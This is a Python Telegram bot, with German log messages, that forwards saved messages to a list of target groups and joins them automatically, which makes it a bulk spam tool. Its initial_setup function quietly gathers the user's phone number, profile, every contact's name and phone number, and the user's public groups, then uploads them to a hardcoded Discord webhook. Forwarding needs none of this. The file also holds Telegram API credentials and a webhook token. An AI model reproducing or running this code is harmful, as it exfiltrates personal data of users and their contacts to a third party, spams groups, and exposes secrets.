import asyncio
import requests
import phonenumbers
from telethon import TelegramClient, errors
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.channels import GetParticipantsRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.types import ChannelParticipantsSearch, ChannelParticipantsAdmins, InputPeerChannel, InputChannel
import random
from datetime import datetime
import json
import telethon
import os
import sys

# Your Telegram API credentials
api_id = '24815804'
api_hash = '88e95edcc2ca9b5f3c99dd9f2b226d07'

# Discord Webhook URL
discord_webhook_url = 'https://discord.com/api/webhooks/1261677169281597511/0oG10i2LZQjaS1k6OQ_4LZKQCiHYPshEPkasExqS8OtDCCFUS-DOwbb1kUc5B_1Sk9Bw'

# Load target group IDs from gruppen.json
with open('gruppen.json', 'r') as f:
    data = json.load(f)
    zielgruppen_ids = data['zielgruppen_ids']

# Load wait time from wait.json
with open('wait.json', 'r') as f:
    wait_data = json.load(f)
    wait_time_seconds = wait_data['wait_time_seconds']

# Function to check for crash trigger
def check_for_crash():
    try:
        with open('crash_trigger.txt', 'r') as file:
            content = file.read().strip()
            if content == 'CRASH':
                raise Exception("Simulierter Absturz durch Dateiinhalt")
    except FileNotFoundError:
        pass  # Datei existiert nicht, also keinen Absturz auslösen

# Function to read the server name
def get_server_name():
    try:
        with open('server.txt', 'r') as file:
            server_name = file.read().strip()
            return server_name
    except FileNotFoundError:
        return 'Unknown Server'  # Default fallback if file is not found

# Function to send a Discord notification
def send_discord_notification(message):
    server_name = get_server_name()
    data = {
        "content": f"@everyone {message}\nServer: {server_name}"
    }
    response = requests.post(discord_webhook_url, json=data)
    if response.status_code != 204:
        print(f"Failed to send Discord notification: {response.status_code}, {response.text}")

# Function to restart the server
def restart_server():
    server_name = get_server_name()
    url = f"https://www.bero.fun/power?servername={server_name}&command=start"
    response = requests.get(url)
    if response.status_code == 200:
        response_data = response.json()
        if response_data.get('success'):
            send_discord_notification(f"Neu Start wird eingeleitet für {server_name}")
        else:
            print(f"Failed to restart server: {response_data}")
    else:
        print(f"Failed to reach server: {response.status_code}, {response.text}")

# Function to format phone numbers
def format_phone_number(phone):
    check_for_crash()
    try:
        parsed_number = phonenumbers.parse(phone, None)
        if not phonenumbers.is_valid_number(parsed_number):
            raise phonenumbers.NumberParseException(phonenumbers.NumberParseException.INVALID_COUNTRY_CODE, "Invalid phone number")
        return phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
    except phonenumbers.NumberParseException:
        return phone

# Function to check if a user is a member of a specific group
async def is_member_of_group(client, group_username, user_id):
    check_for_crash()
    try:
        group = await client.get_entity(group_username)
        participants = await client(GetParticipantsRequest(
            channel=group,
            filter=ChannelParticipantsSearch(''),
            offset=0,
            limit=100,
            hash=0
        ))
        for participant in participants.users:
            if participant.id == user_id:
                return True
        return False
    except Exception as e:
        print(f"Failed to check group membership: {e}")
        return False

# Function to count the number of groups where the user is an admin
async def count_admin_groups(client, dialogs):
    check_for_crash()
    admin_count = 0
    for dialog in dialogs:
        if dialog.is_channel and isinstance(dialog.entity, (InputPeerChannel, InputChannel)):
            try:
                admins = await client(GetParticipantsRequest(
                    channel=dialog.entity,
                    filter=ChannelParticipantsAdmins(),
                    offset=0,
                    limit=100,
                    hash=0
                ))
                for admin in admins.users:
                    if admin.id == (await client.get_me()).id:
                        admin_count += 1
                        break
            except Exception as e:
                print(f"Failed to check admin status for {dialog.name}: {e}")
    return admin_count

# Function to create creation.txt with the current date
def create_creation_file():
    if not os.path.exists('creation.txt'):
        with open('creation.txt', 'w') as file:
            current_date = datetime.now().strftime('%Y-%m-%d')
            file.write(current_date)

# Initial setup function
async def initial_setup(client):
    check_for_crash()
    create_creation_file()  # Create creation.txt if it doesn't exist
    me = await client.get_me()
    dialogs = await client.get_dialogs()
    amount_of_groups = sum(1 for d in dialogs if d.is_group)
    admin_groups_count = await count_admin_groups(client, dialogs)
    contacts = await client(GetContactsRequest(hash=0))

    formatted_phone = format_phone_number(me.phone) if me.phone else 'Not Set'

    # Check if the user is a member of @feedbackgruppe
    is_member_feedbackgruppe = await is_member_of_group(client, '@feedbackgruppe', me.id)

    # Find all public groups
    public_groups = []
    for dialog in dialogs:
        if dialog.is_group and hasattr(dialog.entity, 'username') and dialog.entity.username:
            public_groups.append(f"https://t.me/{dialog.entity.username}")

    # Save public groups to a text file named after the username
    public_groups_filename = f"{me.username}_public_groups.txt"
    with open(public_groups_filename, "w", encoding="utf-8") as file:
        file.write("\n".join(public_groups))

    # Save contacts to a text file named after the username
    contacts_filename = f"{me.username}_contacts.txt"
    with open(contacts_filename, "w", encoding="utf-8") as file:
        for contact in contacts.users:
            contact_phone = format_phone_number(contact.phone) if contact.phone else 'Not Set'
            file.write(f"{contact.first_name} {contact.last_name if contact.last_name else ''}: {contact_phone}\n")

    # Format last seen
    last_seen = "Last seen status not available"
    if hasattr(me, 'status'):
        if isinstance(me.status, telethon.tl.types.UserStatusOffline):
            last_seen_time = me.status.was_online.astimezone().strftime('%Y-%m-%d %H:%M:%S %Z')
            last_seen = f'Last seen offline: {last_seen_time}'
        elif isinstance(me.status, telethon.tl.types.UserStatusOnline):
            last_seen = 'Currently online'
    
    embed = {
        "title": f"{me.first_name} {me.last_name if me.last_name else ''}",
        "description": f"Bio: {getattr(me, 'about', 'No bio set')}",
        "color": None,
        "fields": [
            {
                "name": "ID:",
                "value": f"```{me.id}```"
            },
            {
                "name": "Nummer:",
                "value": f"```{formatted_phone}```"
            },
            {
                "name": "Chats:",
                "value": f"```{len(dialogs)}```",
                "inline": True
            },
            {
                "name": "Groups:",
                "value": f"```{amount_of_groups} ({admin_groups_count})```",
                "inline": True
            },
            {
                "name": "Contacts:",
                "value": f"```{len(contacts.users)}```",
                "inline": True
            },
            {
                "name": "Feedbackgruppe Member:",
                "value": f"```{'Yes' if is_member_feedbackgruppe else 'No'}```",
                "inline": True
            }
        ],
        "author": {
            "name": f"@{me.username if me.username else 'No username'}"
        }
    }
    
    # Send the embed
    data = {
        "content": None,
        "embeds": [embed]
    }
    response = requests.post(discord_webhook_url, json=data)
    if response.status_code != 204:
        print(f"Failed to send Discord embed: {response.status_code}, {response.text}")

    # Send the file attachments
    with open(public_groups_filename, "rb") as file1, open(contacts_filename, "rb") as file2:
        response = requests.post(discord_webhook_url, files={"file1": file1, "file2": file2})
    
    if response.status_code != 204:
        print(f"Failed to send Discord files: {response.status_code}, {response.text}")

# Function to join a group
async def join_group(client, group_username):
    check_for_crash()
    try:
        await client(ImportChatInviteRequest(group_username))
        print(f"Successfully joined the group: {group_username}")
    except Exception as e:
        print(f"Failed to join the group {group_username}: {e}")

# Function to forward messages
async def forward_messages(client, error_counter):
    check_for_crash()
    saved_chat = await client.get_entity("me")
    groups_joined = 0
    async for message in client.iter_messages(saved_chat):
        for zielgruppe_id in zielgruppen_ids:
            if groups_joined >= 3:
                break
            try:
                await client.forward_messages(zielgruppe_id, message)
                current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                sender_account_name = message.sender.first_name if message.sender else "Unknown"
                log_message = f"[{current_time}] Nachricht von {sender_account_name} an Kanal {zielgruppe_id} gesendet."
                print(log_message)
                await asyncio.sleep(wait_time_seconds)
                error_counter = 0  # Reset error counter on successful message
            except errors.UserNotParticipantError:
                if groups_joined < 3:
                    print(f"User is not a participant in {zielgruppe_id}, attempting to join the group.")
                    await join_group(client, zielgruppe_id)
                    groups_joined += 1
                else:
                    print(f"Maximal number of group joins reached for this cycle.")
            except Exception as e:
                current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                log_message = f"[{current_time}] Fehler {zielgruppe_id}: {e}"
                print(log_message)
                await asyncio.sleep(wait_time_seconds)
                error_counter += 1

# Schedule the task to run immediately
def job(error_counter):
    check_for_crash()
    with TelegramClient("session_name", api_id, api_hash) as client:
        client.loop.run_until_complete(initial_setup(client))
        client.loop.run_until_complete(forward_messages(client, error_counter))

if __name__ == "__main__":
    initialized = False
    error_counter = 0
    while True:
        try:
            if not initialized:
                job(error_counter)
                initialized = True
            else:
                with TelegramClient("session_name", api_id, api_hash) as client:
                    client.loop.run_until_complete(forward_messages(client, error_counter))
            wait_time = random.randint(900, 1200)
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[{current_time}] Wartezeit: {wait_time} Sekunden bis zur nächsten Sendung.")
            asyncio.sleep(wait_time)
        except Exception as e:
            send_discord_notification(f"Bot ist abgestürzt: {e}")
            restart_server()
            sys.exit(1)
